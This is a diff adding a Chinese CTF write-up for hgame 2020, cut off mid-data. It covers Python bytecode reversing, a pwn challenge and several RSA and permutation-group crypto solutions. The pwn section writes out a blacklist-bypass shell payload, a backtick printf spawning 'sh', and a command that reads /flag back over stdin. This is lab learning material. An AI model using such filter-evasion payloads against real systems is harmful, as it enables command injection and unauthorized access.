+    r <span style="color:#f92672">=</span> []
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">6</span>):
+        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">6</span>):
+            r<span style="color:#f92672">.</span>append(l[j][i])
+    <span style="color:#66d9ef">return</span> r
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dec</span>():
+    p <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(patten)
+    _ciphers <span style="color:#f92672">=</span> [list(p[i<span style="color:#f92672">*</span><span style="color:#ae81ff">6</span>:i<span style="color:#f92672">*</span><span style="color:#ae81ff">6</span><span style="color:#f92672">+</span><span style="color:#ae81ff">6</span>])<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">6</span>)]
+    r <span style="color:#f92672">=</span> list(range(<span style="color:#ae81ff">5</span>)); r<span style="color:#f92672">.</span>reverse()
+    c <span style="color:#f92672">=</span> list(range(<span style="color:#ae81ff">6</span>)); c<span style="color:#f92672">.</span>reverse()
+    <span style="color:#66d9ef">for</span> row <span style="color:#f92672">in</span> r:
+        <span style="color:#66d9ef">for</span> col <span style="color:#f92672">in</span> c:
+            _ciphers[row][col] <span style="color:#f92672">-=</span> _ciphers[row<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>][col]
+            _ciphers[row][col] <span style="color:#f92672">%=</span> <span style="color:#ae81ff">256</span>
+    raw_flag <span style="color:#f92672">=</span> bytes(unlistcomp(_ciphers))
+    raw_flag <span style="color:#f92672">=</span> raw_flag[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+    <span style="color:#66d9ef">print</span>(f<span style="color:#e6db74">&#39;hgame{{{raw_flag.decode()}}}&#39;</span>)
+
+dec()
+</code></pre></div><p>（刚开始还没算出来正确的，因为没注意到上面的listcomp有行列变换过。。）
+然后就很轻松得运行得到flag。。
+<code>hgame{Pyth0N~OpCOde_i$-5O~!NTEre$tINGG89!!}</code></p>
+<p>附：<a href="https://zhuanlan.zhihu.com/p/45101508">手工还原python源码</a></p>
+<h4 id="bbbbbb">bbbbbb</h4>
+<p>做不来，咕咕咕</p>
+<h3 id="0x02-pwn">0x02 Pwn</h3>
+<h4 id="findyourself">findyourself</h4>
+<p>这题有点好玩，其实就是在考linux。。
+ida打开，程序初始化一坨随机目录然后进入任意一个
+<img src="media/15798363305346/Screen%20Shot%202020-01-30%20at%204.17.27%20PM.png" alt="Screen Shot 2020-01-30 at 4.17.27 P-w492">
+注意其中check1函数是会过滤关键字的。
+<img src="media/15798363305346/Screen%20Shot%202020-01-30%20at%204.18.57%20PM.png" alt="Screen Shot 2020-01-30 at 4.18.57 P-w971">
+除了<code>[a-zA-z\-/ ]</code>其他的都不行。。
+输入<code>ls -l /proc/self/cwd</code>拿到当前输入，然后继续
+第二次system的输入也会过滤关键字，不过更像是黑名单
+<img src="media/15798363305346/Screen%20Shot%202020-01-30%20at%204.20.36%20PM.png" alt="Screen Shot 2020-01-30 at 4.20.36 P-w395">
+这里要注意的，会关闭标准输出。。所以下一条命令你输啥都不会有显示的。。
+<img src="media/15798363305346/Screen%20Shot%202020-01-30%20at%204.21.39%20PM.png" alt="Screen Shot 2020-01-30 at 4.21.39 P-w96">
+这就是最狠的地方了，因为我想了半天都卡在不能用重定向符还怎么控制输出。。即使stdin还是开着的。。
+后来看了一下shell内置命令，用<code>`printf 's%s' h`</code>绕过了关键字过滤拿到shell，然后<code>cat /flag &gt;&amp;0</code>传回flag。
+<img src="media/15798363305346/Screen%20Shot%202020-01-30%20at%204.33.15%20PM.png" alt="Screen Shot 2020-01-30 at 4.33.15 P-w509">
+后来问了出题人。。他预期是直接<code>$0</code>拿shell。。</p>
+<h5 id="c老板不教我太难了aris真好">C老板**不教我，太难了（Aris真好）</h5>
+<h3 id="0x03-crypto">0x03 Crypto</h3>
+<h4 id="verification_code">Verification_code</h4>
+<p>签到题，前四位sha256爆破就行，直接上代码</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#f92672">import</span> string<span style="color:#f92672">,</span> random
+<span style="color:#f92672">from</span> hashlib <span style="color:#f92672">import</span> sha256
+
+d <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>ascii_letters<span style="color:#f92672">+</span>string<span style="color:#f92672">.</span>digits
+
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> d:
+    <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> d:
+        <span style="color:#66d9ef">for</span> k <span style="color:#f92672">in</span> d:
+            <span style="color:#66d9ef">for</span> l <span style="color:#f92672">in</span> d:
+                x <span style="color:#f92672">=</span> i<span style="color:#f92672">+</span>j<span style="color:#f92672">+</span>k<span style="color:#f92672">+</span>l<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;PU5a9N6lFog9VXb7&#34;</span>
+                h <span style="color:#f92672">=</span> sha256(x<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()
+                <span style="color:#66d9ef">if</span> h <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;4ce80bdb3424a743713400a442cdbcf9b18de1c9a6655c1f5336ff04453f47d3&#34;</span>:
+                    <span style="color:#66d9ef">print</span>(x)
+                    exit(<span style="color:#ae81ff">0</span>)
+</code></pre></div><p>算出后输入那四位然后再输入<code>I like playing Hgame</code>，拿到flag</p>
+<h4 id="remainder">Remainder</h4>
+<p>中国剩余定理的应用，看了好久的数论才明白个大概。。
+<img src="media/15798363305346/Screen%20Shot%202020-01-25%20at%208.13.34%20PM.png" alt="Screen Shot 2020-01-25 at 8.13.34 P-w144">
+这是RSA标准的公钥加密公示，其中
+<img src="media/15798363305346/Screen%20Shot%202020-01-25%20at%208.15.02%20PM.png" alt="Screen Shot 2020-01-25 at 8.15.02 P-w52">
+这个计算可以分成两部分进行
+<img src="media/15798363305346/Screen%20Shot%202020-01-25%20at%208.15.58%20PM.png" alt="Screen Shot 2020-01-25 at 8.15.58 P-w243">
+根据费马小定理可以知道
+<img src="media/15798363305346/Screen%20Shot%202020-01-25%20at%208.16.59%20PM.png" alt="Screen Shot 2020-01-25 at 8.16.59 P-w253">
+<img src="media/15798363305346/Screen%20Shot%202020-01-25%20at%208.17.21%20PM.png" alt="Screen Shot 2020-01-25 at 8.17.21 P-w234">
+再根据中国剩余定理
+<img src="media/15798363305346/Screen%20Shot%202020-01-25%20at%208.17.57%20PM.png" alt="Screen Shot 2020-01-25 at 8.17.57 P-w392">
+<img src="media/15798363305346/Screen%20Shot%202020-01-25%20at%208.18.05%20PM.png" alt="Screen Shot 2020-01-25 at 8.18.05 P-w228">
+就能算出用原公钥加密的信息，解密就是常规的RSA解密步骤了。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#75715e">##!/usr/bin/env python3</span>
+<span style="color:#75715e">## -*- coding: utf-8 -*-</span>
+<span style="color:#f92672">from</span> Crypto.Util <span style="color:#f92672">import</span> number
+
+p <span style="color:#f92672">=</span> <span style="color:#ae81ff">94598296305713376652540411631949434301396235111673372738276754654188267010805522542068004453137678598891335408170277601381944584279339362056579262308427544671688614923839794522671378559276784734758727213070403838632286280473450086762286706863922968723202830398266220533885129175502142533600559292388005914561</span>
+q <span style="color:#f92672">=</span> <span style="color:#ae81ff">150088216417404963893679242888992998793257903343994792697939121738029477790454833496600101388493792476973514786401036309378542808470513073408894727406158296404360452232777491992630316999043165374635001806841520490997788796152678742544032835808854339130676283497122770901196468323977265095016407164510827505883</span>
+r <span style="color:#f92672">=</span> <span style="color:#ae81ff">145897736096689096151704740327665176308625097484116713780050311198775607465862066406830851710261868913835866335107146242979359964945125214420821146670919741118254402096944139483988745450480989706524191669371208210272907563936516990473246615375022630708213486725809819360033470468293100926616729742277729705727</span>
+
+n <span style="color:#f92672">=</span> p <span style="color:#f92672">*</span> q <span style="color:#f92672">*</span> r
+e <span style="color:#f92672">=</span> <span style="color:#ae81ff">65537</span>
+d <span style="color:#f92672">=</span> number<span style="color:#f92672">.</span>inverse(e, (p<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> (q<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> (r<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>))
+
+Cp <span style="color:#f92672">=</span> <span style="color:#ae81ff">78430786011650521224561924814843614294806974988599591058915520397518526296422791089692107488534157589856611229978068659970976374971658909987299759719533519358232180721480719635602515525942678988896727128884803638257227848176298172896155463813264206982505797613067215182849559356336015634543181806296355552543</span> 
+Cq <span style="color:#f92672">=</span> <span style="color:#ae81ff">49576356423474222188205187306884167620746479677590121213791093908977295803476203510001060180959190917276817541142411523867555147201992480220531431019627681572335103200586388519695931348304970651875582413052411224818844160945410884130575771617919149619341762325633301313732947264125576866033934018462843559419</span> 
+Cr <span style="color:#f92672">=</span> <span style="color:#ae81ff">48131077962649497833189292637861442767562147447040134411078884485513840553188185954383330236190253388937785530658279768620213062244053151614962893628946343595642513870766877810534480536737200302699539396810545420021054225204683428522820350356470883574463849146422150244304147618195613796399010492125383322922</span>
+
+c1 <span style="color:#f92672">=</span> number<span style="color:#f92672">.</span>inverse(q<span style="color:#f92672">*</span>r, p)
+c2 <span style="color:#f92672">=</span> number<span style="color:#f92672">.</span>inverse(p<span style="color:#f92672">*</span>r, q)
+c3 <span style="color:#f92672">=</span> number<span style="color:#f92672">.</span>inverse(p<span style="color:#f92672">*</span>q, r)
+
+C <span style="color:#f92672">=</span> ( Cp <span style="color:#f92672">*</span> c1 <span style="color:#f92672">*</span> q <span style="color:#f92672">*</span> r <span style="color:#f92672">+</span> Cq <span style="color:#f92672">*</span> c2 <span style="color:#f92672">*</span> p <span style="color:#f92672">*</span> r <span style="color:#f92672">+</span> Cr <span style="color:#f92672">*</span> c3 <span style="color:#f92672">*</span> p <span style="color:#f92672">*</span> q) <span style="color:#f92672">%</span> n
+m <span style="color:#f92672">=</span> pow(C, d, n)
+
+<span style="color:#66d9ef">assert</span> pow(m, e, n) <span style="color:#f92672">==</span> C
+<span style="color:#66d9ef">assert</span> pow(m, e, p) <span style="color:#f92672">==</span> Cp
+<span style="color:#66d9ef">assert</span> pow(m, e, q) <span style="color:#f92672">==</span> Cq
+<span style="color:#66d9ef">assert</span> pow(m, e, r) <span style="color:#f92672">==</span> Cr
+
+msg <span style="color:#f92672">=</span> number<span style="color:#f92672">.</span>long_to_bytes(m)<span style="color:#f92672">.</span>decode()
+<span style="color:#66d9ef">print</span>(msg)
+flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join( [ s[:<span style="color:#ae81ff">2</span>] <span style="color:#66d9ef">for</span> s <span style="color:#f92672">in</span> msg<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>) <span style="color:#66d9ef">if</span> s<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#39; &#39;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span> ] )
+<span style="color:#66d9ef">print</span>(flag)
+</code></pre></div><p>这里刚开始我是拿前两个p和q来计算的，算出来msg不对长度也不符，把三个一起用上才得到结果。后来问出题人才大概知道，只用两个质数其实是存在无数解的，所以得用三个或以上才行。。
+<img src="media/15798363305346/Screen%20Shot%202020-01-25%20at%208.24.07%20PM.png" alt="Screen Shot 2020-01-25 at 8.24.07 P-w268">
+<em>参考资料：</em> <a href="http://read.pudn.com/downloads67/doc/comm/242955/%E5%89%A9%E4%BD%99%E5%AE%9A%E7%90%86.pdf">中国剩余定理</a></p>
+<h4 id="inv">Inv</h4>
+<p>这题是第一天晚上就想试着解决的结果卡了我好久，一直找不到思路。
+后来出题人放资料「共模攻击」，也试着去看但还是看不出啥。
+终于在看了一晚的群论之后，知道了解法。。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python">e <span style="color:#f92672">=</span> [ _ <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>) ]
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">mul</span>(a, b):
+    <span style="color:#66d9ef">assert</span> len(a) <span style="color:#f92672">==</span> len(b)
+    <span style="color:#66d9ef">return</span> [ a[_] <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> b ]
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">div_l</span>(c, b):
+    <span style="color:#66d9ef">assert</span> len(b) <span style="color:#f92672">==</span> len(c)
+    a <span style="color:#f92672">=</span> [ None <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>) ]
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>):
+        a[b[i]] <span style="color:#f92672">=</span> c[i]
+    <span style="color:#66d9ef">return</span> a
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">div_r</span>(c ,a):
+    <span style="color:#66d9ef">assert</span> len(a) <span style="color:#f92672">==</span> len(c)
+    <span style="color:#66d9ef">return</span> [ a<span style="color:#f92672">.</span>index(i) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> c ]
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">inverse</span>(a):
+    <span style="color:#66d9ef">return</span> div_l(e, a)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_pow</span>(x, m):
+    y <span style="color:#f92672">=</span> x
+    m <span style="color:#f92672">=</span> bin(m)[<span style="color:#ae81ff">3</span>:]
+    <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> m:
+        y <span style="color:#f92672">=</span> mul(y, y)
+        <span style="color:#66d9ef">if</span> _ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;1&#39;</span>:
+            y <span style="color:#f92672">=</span> mul(x, y)
+    <span style="color:#66d9ef">return</span> y
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_pow2</span>(x, m):
+    y <span style="color:#f92672">=</span> x
+    m <span style="color:#f92672">=</span> bin(m)[<span style="color:#ae81ff">3</span>:]
+    n <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+    <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> m:
+        n <span style="color:#f92672">*=</span> <span style="color:#ae81ff">2</span>
+        <span style="color:#66d9ef">if</span> _ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;1&#39;</span>:
+            n <span style="color:#f92672">+=</span><span style="color:#ae81ff">1</span>
+    <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(n<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>):
+        y <span style="color:#f92672">=</span> mul(y, x)
+    <span style="color:#66d9ef">return</span> y
+</code></pre></div><p>把这种<code>range(256)</code>的bytes当成一种数据，它们运算的结果也都在<code>range(256)</code>内，并且他们都满足一些特定的运算关系，构成了一个有限群（但是为非阿贝尔群，因为<code>a*b == b*a</code>并不恒成立）
+它们有如下的运算性质：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">test</span>():
+    <span style="color:#f92672">import</span> os<span style="color:#f92672">,</span> random
+    random<span style="color:#f92672">.</span>seed(os<span style="color:#f92672">.</span>urandom(<span style="color:#ae81ff">8</span>))
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rand_list</span>():
+        l <span style="color:#f92672">=</span> list(range(<span style="color:#ae81ff">256</span>))
+        random<span style="color:#f92672">.</span>shuffle(l)
+        <span style="color:#66d9ef">return</span> l
+    a <span style="color:#f92672">=</span> rand_list()
+    b <span style="color:#f92672">=</span> rand_list()
+    c <span style="color:#f92672">=</span> rand_list()
+    <span style="color:#75715e"># a != b &amp;&amp; a != c &amp;&amp; b != c</span>
+    <span style="color:#66d9ef">assert</span> a <span style="color:#f92672">!=</span> b <span style="color:#f92672">and</span> a <span style="color:#f92672">!=</span> c <span style="color:#f92672">and</span> b <span style="color:#f92672">!=</span> c
+    <span style="color:#75715e"># a * 1 = 1 * a = a</span>
+    <span style="color:#66d9ef">assert</span> mul(a, e) <span style="color:#f92672">==</span> mul(e, a) <span style="color:#f92672">==</span> a
+    <span style="color:#75715e"># (a * b) * c = a * (b * c)</span>
+    <span style="color:#66d9ef">assert</span> mul(mul(a, b), c) <span style="color:#f92672">==</span> mul(a, mul(b, c))
+    <span style="color:#75715e"># s = a * b</span>
+    s <span style="color:#f92672">=</span> mul(a, b)
+    <span style="color:#75715e"># s / b = a</span>
+    <span style="color:#66d9ef">assert</span> div_l(s, b) <span style="color:#f92672">==</span> a
+    <span style="color:#75715e"># s \ a = b</span>
+    <span style="color:#66d9ef">assert</span> div_r(s, a) <span style="color:#f92672">==</span> b
+    <span style="color:#75715e"># _a = a^-1</span>
+    _a <span style="color:#f92672">=</span> inverse(a)
+    <span style="color:#75715e"># _a * a = a * _a = 1</span>
+    <span style="color:#66d9ef">assert</span> mul(a, _a) <span style="color:#f92672">==</span> mul(_a, a) <span style="color:#f92672">==</span> e
+    <span style="color:#75715e"># a ^ 1024 = a * a * ... * a</span>
+    <span style="color:#66d9ef">assert</span> _pow(a, <span style="color:#ae81ff">1024</span>) <span style="color:#f92672">==</span> _pow2(a, <span style="color:#ae81ff">1024</span>)
+    <span style="color:#75715e"># x = a ^ 100 ; y = a ^ 110</span>
+    x <span style="color:#f92672">=</span> _pow(a, <span style="color:#ae81ff">100</span>)
+    y <span style="color:#f92672">=</span> _pow(a, <span style="color:#ae81ff">110</span>)
+    <span style="color:#75715e"># y / x = y \ x = a ^ 10</span>
+    <span style="color:#66d9ef">assert</span> div_l(y, x) <span style="color:#f92672">==</span> div_r(y, x) <span style="color:#f92672">==</span> _pow(a, <span style="color:#ae81ff">10</span>)
+    <span style="color:#75715e"># a ^ -123 * a ^ 321 = a ^ (321 - 123) = a ^ 321 - a ^ 123</span>
+    <span style="color:#66d9ef">assert</span> mul(inverse(_pow(a, <span style="color:#ae81ff">123</span>)), _pow(a, <span style="color:#ae81ff">321</span>))<span style="color:#f92672">==</span> _pow(a, <span style="color:#ae81ff">321</span><span style="color:#f92672">-</span><span style="color:#ae81ff">123</span>) <span style="color:#f92672">==</span> div_l(_pow(a, <span style="color:#ae81ff">321</span>), _pow(a, <span style="color:#ae81ff">123</span>))
+
+test()
+</code></pre></div><p>这样就把问题变成了，已知<code>s^595</code>和<code>s^739</code>的值，求s。初中数学题（然而我是拿来凑的。。）</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#75715e">## _pow(s, 595)</span>
+<span style="color:#75715e">## _pow(s, 739)</span>
+s_595 <span style="color:#f92672">=</span> list(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xc8</span><span style="color:#e6db74">&amp;</span><span style="color:#ae81ff">\xc1</span><span style="color:#e6db74">E</span><span style="color:#ae81ff">\xbe</span><span style="color:#e6db74">*</span><span style="color:#ae81ff">\xc5\x84\xdb</span><span style="color:#e6db74">1</span><span style="color:#ae81ff">\x05\x9b\xc0\xf2\xac</span><span style="color:#e6db74">/</span><span style="color:#ae81ff">\x0b</span><span style="color:#e6db74">0</span><span style="color:#ae81ff">\x8d\&#39;\xc2</span><span style="color:#e6db74">b</span><span style="color:#ae81ff">\x89\x93\xa6\xcd\xe1\x1b\xf4</span><span style="color:#e6db74">H</span><span style="color:#ae81ff">\xff</span><span style="color:#e6db74">a</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">A</span><span style="color:#ae81ff">\xf7</span><span style="color:#e6db74">,(</span><span style="color:#ae81ff">\xea</span><span style="color:#e6db74">?</span><span style="color:#ae81ff">\xa8\xa0\x8b\xf1\xf9</span><span style="color:#e6db74">&#34;X</span><span style="color:#ae81ff">\n\x86</span><span style="color:#e6db74">fj</span><span style="color:#ae81ff">\x07</span><span style="color:#e6db74">4</span><span style="color:#ae81ff">\x7f</span><span style="color:#e6db74">BO</span><span style="color:#ae81ff">\xd4</span><span style="color:#e6db74">F</span><span style="color:#ae81ff">\xbd\xe6\xd9\xa7\xaf\x8a\x8c\xde\xab</span><span style="color:#e6db74">;!PT</span><span style="color:#ae81ff">\x15</span><span style="color:#e6db74">)+w</span><span style="color:#ae81ff">\xbc\x00</span><span style="color:#e6db74">&gt;</span><span style="color:#ae81ff">\xc6</span><span style="color:#e6db74">g</span><span style="color:#ae81ff">\xc3\x85</span><span style="color:#e6db74">=9K</span><span style="color:#ae81ff">\xb6</span><span style="color:#e6db74">&lt;</span><span style="color:#ae81ff">\xb7</span><span style="color:#e6db74">x</span><span style="color:#ae81ff">\xae</span><span style="color:#e6db74">UG</span><span style="color:#ae81ff">\x83</span><span style="color:#e6db74">vk</span><span style="color:#ae81ff">\xa9\xf6</span><span style="color:#e6db74">{</span><span style="color:#ae81ff">\x03</span><span style="color:#e6db74">Y</span><span style="color:#ae81ff">\x87\x14</span><span style="color:#e6db74">e</span><span style="color:#ae81ff">\xfd\xed</span><span style="color:#e6db74">@i</span><span style="color:#ae81ff">\xcc</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\xd1\xeb</span><span style="color:#e6db74">o</span><span style="color:#ae81ff">\x10</span><span style="color:#e6db74">6</span><span style="color:#ae81ff">\xe2\xe7\xd7\xee</span><span style="color:#e6db74">u</span><span style="color:#ae81ff">\x9e\xfe\x95</span><span style="color:#e6db74">^R</span><span style="color:#ae81ff">\xfb</span><span style="color:#e6db74">8</span><span style="color:#ae81ff">\x04\xb4</span><span style="color:#e6db74">S</span><span style="color:#ae81ff">\x16\xe0\xad\xd8\x98</span><span style="color:#e6db74">n</span><span style="color:#ae81ff">\xca\xe4\xdd\xd2\xc7\x99</span><span style="color:#e6db74">l</span><span style="color:#ae81ff">\xb3\\</span><span style="color:#e6db74">2L</span><span style="color:#ae81ff">\xa3\x1d</span><span style="color:#e6db74">:_</span><span style="color:#ae81ff">\x12\xb8</span><span style="color:#e6db74">7</span><span style="color:#ae81ff">\x17\x01\xb1</span><span style="color:#e6db74">#~q</span><span style="color:#ae81ff">\x1c\t\xe8\xda</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\xef\xcb\x0c\xe5\x80\xdf\xc9</span><span style="color:#e6db74">y</span><span style="color:#ae81ff">\x0e</span><span style="color:#e6db74">`</span><span style="color:#ae81ff">\xe9\x94\xd0\xcf</span><span style="color:#e6db74">W</span><span style="color:#ae81ff">\x1f</span><span style="color:#e6db74">5</span><span style="color:#ae81ff">\xf5</span><span style="color:#e6db74">h</span><span style="color:#ae81ff">\xbf\xba\x91\xb9</span><span style="color:#e6db74">d</span><span style="color:#ae81ff">\xfc</span><span style="color:#e6db74">M</span><span style="color:#ae81ff">\x81\xec\x88\xb2</span><span style="color:#e6db74">c</span><span style="color:#ae81ff">\x9f\xa4</span><span style="color:#e6db74">J|</span><span style="color:#ae81ff">\xd3</span><span style="color:#e6db74">m</span><span style="color:#ae81ff">\xd6</span><span style="color:#e6db74">s</span><span style="color:#ae81ff">\xd5\x92\x9d\x9a</span><span style="color:#e6db74">3</span><span style="color:#ae81ff">\xa2\xb5\xfa\x19</span><span style="color:#e6db74">N</span><span style="color:#ae81ff">\xa1\x82</span><span style="color:#e6db74">][</span><span style="color:#ae81ff">\xf8\x06\x13\xdc</span><span style="color:#e6db74">C</span><span style="color:#ae81ff">\x1e\x1a\xaa\xc4</span><span style="color:#e6db74">tz</span><span style="color:#ae81ff">\x08\x8f</span><span style="color:#e6db74">%$D</span><span style="color:#ae81ff">\xbb\x97</span><span style="color:#e6db74"> </span><span style="color:#ae81ff">\xce\x96</span><span style="color:#e6db74">V</span><span style="color:#ae81ff">\xe3\x02</span><span style="color:#e6db74">I</span><span style="color:#ae81ff">\x18\x11\x0f\r\xf3</span><span style="color:#e6db74">p</span><span style="color:#ae81ff">\x8e\xa5</span><span style="color:#e6db74">Z-</span><span style="color:#ae81ff">\xf0</span><span style="color:#e6db74">}</span><span style="color:#ae81ff">\xb0</span><span style="color:#e6db74">Q</span><span style="color:#ae81ff">\x9c</span><span style="color:#e6db74">&#39;</span>)
+s_739 <span style="color:#f92672">=</span> list(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;U</span><span style="color:#ae81ff">\x17\x8a</span><span style="color:#e6db74">E</span><span style="color:#ae81ff">\xa6\x19\xab\x7f</span><span style="color:#e6db74">d0</span><span style="color:#ae81ff">\xd2</span><span style="color:#e6db74">)</span><span style="color:#ae81ff">\xc0\xae\xcc</span><span style="color:#e6db74">/G_</span><span style="color:#ae81ff">\xe3\&#39;\r\xfb\xaf\x00\xb1</span><span style="color:#e6db74">hgi-</span><span style="color:#ae81ff">\xc1\xff</span><span style="color:#e6db74">a</span><span style="color:#ae81ff">\x8d\t</span><span style="color:#e6db74">&amp;</span><span style="color:#ae81ff">\x99</span><span style="color:#e6db74">k</span><span style="color:#ae81ff">\x95\x93\xa8</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\x07\xcd\x87\x01\xe8\x89\x86\xf6</span><span style="color:#e6db74">f48F</span><span style="color:#ae81ff">\xdc\x96\xd4</span><span style="color:#e6db74">`P</span><span style="color:#ae81ff">\xd6</span><span style="color:#e6db74">!</span><span style="color:#ae81ff">\xfe\xc4</span><span style="color:#e6db74">B:</span><span style="color:#ae81ff">\xd3</span><span style="color:#e6db74">1C</span><span style="color:#ae81ff">\x9f\x1d</span><span style="color:#e6db74">T{2c9</span><span style="color:#ae81ff">\x0b</span><span style="color:#e6db74">Y5#</span><span style="color:#ae81ff">\xf7\xb8</span><span style="color:#e6db74">H</span><span style="color:#ae81ff">\xe0</span><span style="color:#e6db74">Db</span><span style="color:#ae81ff">\xb6</span><span style="color:#e6db74">wv</span><span style="color:#ae81ff">\xe1\xbb</span><span style="color:#e6db74">I</span><span style="color:#ae81ff">\x8f\x83</span><span style="color:#e6db74">l</span><span style="color:#ae81ff">\x80\xa9\x04</span><span style="color:#e6db74">q</span><span style="color:#ae81ff">\x03\xf0</span><span style="color:#e6db74">m</span><span style="color:#ae81ff">\xf4\x1b</span><span style="color:#e6db74">p</span><span style="color:#ae81ff">\x8e\xc6</span><span style="color:#e6db74">u</span><span style="color:#ae81ff">\xfd\x16</span><span style="color:#e6db74">$</span><span style="color:#ae81ff">\x06\xf9</span><span style="color:#e6db74">Z</span><span style="color:#ae81ff">\xec\xa2\xcb\xd7</span><span style="color:#e6db74">V</span><span style="color:#ae81ff">\xb9\xd1\xbd</span><span style="color:#e6db74">t^</span><span style="color:#ae81ff">\xe7\xe2\xac\x18\xb4\x15</span><span style="color:#e6db74">=n</span><span style="color:#ae81ff">\xad\xd8</span><span style="color:#e6db74">S+</span><span style="color:#ae81ff">\xca\xeb\xdd\xd0</span><span style="color:#e6db74">;</span><span style="color:#ae81ff">\x84\xe6\x08\x8c</span><span style="color:#e6db74">3</span><span style="color:#ae81ff">\xb3\x90\x02\xc8</span><span style="color:#e6db74">}</span><span style="color:#ae81ff">\xee\xea</span><span style="color:#e6db74">7K</span><span style="color:#ae81ff">\x98\xde\x8b</span><span style="color:#e6db74">~</span><span style="color:#ae81ff">\xcf\xfa\x11\n\xda\xa4</span><span style="color:#e6db74">L</span><span style="color:#ae81ff">\xa3\x0c</span><span style="color:#e6db74">WQ</span><span style="color:#ae81ff">\xdf\xc9</span><span style="color:#e6db74">yj</span><span style="color:#ae81ff">\x9d\xe9\xfc</span><span style="color:#e6db74">JO</span><span style="color:#ae81ff">\x1a\x1f\xdb\xf5</span><span style="color:#e6db74">M</span><span style="color:#ae81ff">\xbf\x9e</span><span style="color:#e6db74"> e</span><span style="color:#ae81ff">\x1c</span><span style="color:#e6db74">*</span><span style="color:#ae81ff">\x9b\x85\xe5\x88\xb2\xc7\xf2\x91\x10\x0e</span><span style="color:#e6db74">,</span><span style="color:#ae81ff">\xd9</span><span style="color:#e6db74">&lt;s</span><span style="color:#ae81ff">\xd5\xef\xb0</span><span style="color:#e6db74">@|</span><span style="color:#ae81ff">\xc3\xbc</span><span style="color:#e6db74">(</span><span style="color:#ae81ff">\xb5</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xa1\x82\xa7</span><span style="color:#e6db74">[</span><span style="color:#ae81ff">\xf8</span><span style="color:#e6db74">A</span><span style="color:#ae81ff">\x13\x14\xc2\x1e</span><span style="color:#e6db74">N</span><span style="color:#ae81ff">\xaa</span><span style="color:#e6db74">o</span><span style="color:#ae81ff">\xed</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\xba\xce</span><span style="color:#e6db74">x]</span><span style="color:#ae81ff">\x92\x05\x97\x12\xc5</span><span style="color:#e6db74">%</span><span style="color:#ae81ff">\\\xb7</span><span style="color:#e6db74">&gt;R</span><span style="color:#ae81ff">\x9a\x94\x0f</span><span style="color:#e6db74">X</span><span style="color:#ae81ff">\xf3\xbe</span><span style="color:#e6db74">?</span><span style="color:#ae81ff">\xa5\xe4\xa0</span><span style="color:#e6db74">z</span><span style="color:#ae81ff">\xf1</span><span style="color:#e6db74">6</span><span 